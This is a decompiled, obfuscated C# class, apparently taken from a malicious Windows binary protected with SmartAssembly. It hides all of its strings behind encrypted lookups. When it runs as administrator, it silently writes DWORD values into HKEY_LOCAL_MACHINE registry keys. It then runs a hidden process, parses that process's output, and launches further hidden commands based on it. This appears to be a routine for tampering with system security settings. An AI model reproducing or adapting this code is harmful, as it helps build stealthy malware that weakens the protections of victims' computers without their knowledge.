using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace RshJmeUGgeNp;

public static class AfrDAfXwyYnS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void tvVQDqBrzSr()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			KetetobKzwZ(getString_0(107407350), getString_0(107407289), getString_0(107389598));
			KetetobKzwZ(getString_0(107407296), getString_0(107406723), getString_0(107407894));
			KetetobKzwZ(getString_0(107406666), getString_0(107406577), getString_0(107407894));
			KetetobKzwZ(getString_0(107406666), getString_0(107406540), getString_0(107407894));
			KetetobKzwZ(getString_0(107406666), getString_0(107406535), getString_0(107407894));
			IFcEAWUxvRsmdqx();
		}
	}

	private static void KetetobKzwZ(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void IFcEAWUxvRsmdqx()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392687),
			Arguments = getString_0(107406498),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107406973)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107406895));
			}
			else if (text.StartsWith(getString_0(107406577)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107406826));
			}
			else if (text.StartsWith(getString_0(107406789)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107406756));
			}
			else if (text.StartsWith(getString_0(107406179)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107406150));
			}
			else if (text.StartsWith(getString_0(107406089)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107406032));
			}
			else if (text.StartsWith(getString_0(107405975)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107406458));
			}
			else if (text.StartsWith(getString_0(107406365)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107406332));
			}
			else if (text.StartsWith(getString_0(107406267)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107405678));
			}
			else if (text.StartsWith(getString_0(107405633)) && text.EndsWith(getString_0(107406904)))
			{
				cvfIcrKnyGtB(getString_0(107405604));
			}
			else if (text.StartsWith(getString_0(107405543)) && !text.EndsWith(getString_0(107405482)))
			{
				cvfIcrKnyGtB(getString_0(107405509));
			}
			else if (text.StartsWith(getString_0(107405932)) && !text.EndsWith(getString_0(107389598)))
			{
				cvfIcrKnyGtB(getString_0(107405911));
			}
			else if (text.StartsWith(getString_0(107405866)) && !text.EndsWith(getString_0(107405865)))
			{
				cvfIcrKnyGtB(getString_0(107405860));
			}
			else if (text.StartsWith(getString_0(107405791)) && !text.EndsWith(getString_0(107405865)))
			{
				cvfIcrKnyGtB(getString_0(107405754));
			}
			else if (text.StartsWith(getString_0(107405145)) && !text.EndsWith(getString_0(107405865)))
			{
				cvfIcrKnyGtB(getString_0(107405112));
			}
			else if (text.StartsWith(getString_0(107405087)) && !text.EndsWith(getString_0(107405865)))
			{
				cvfIcrKnyGtB(getString_0(107405050));
			}
		}
	}

	public static void cvfIcrKnyGtB(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107392687),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static AfrDAfXwyYnS()
	{
		Strings.CreateGetStringDelegate(typeof(AfrDAfXwyYnS));
	}
}
